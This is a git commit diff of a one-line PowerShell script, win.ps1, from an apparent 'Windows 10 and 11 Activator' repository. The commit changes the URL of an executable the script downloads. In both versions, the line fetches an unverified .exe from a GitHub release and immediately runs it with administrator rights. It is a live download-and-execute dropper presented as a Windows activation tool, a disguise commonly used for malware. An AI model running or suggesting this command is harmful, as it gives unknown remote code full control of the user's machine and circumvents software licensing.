71e53ad33b0404c1bcfe595d72f7b03973fb7000
betamod9 <164927681+betamod9@users.noreply.github.com>
2025-01-27 02:12:00 +0200

    Update win.ps1

--- win.ps1
+++ win.ps1
@@ -1,1 +1,1 @@
-irm "https://github.com/betamod9/Windows-10-and-11-Activator/releases/download/12.27.2024/WinKeyAplly.exe" -OutFile "WinKeyAplly.exe"; Start-Process -FilePath "WinKeyAplly.exe" -Verb RunAs
+irm "https://github.com/betamod9/Windows-10-and-11-Activator/releases/download/12.27.2024/WindowsActivator.exe" -OutFile "WinKeyAplly.exe"; Start-Process -FilePath "WinKeyAplly.exe" -Verb RunAs
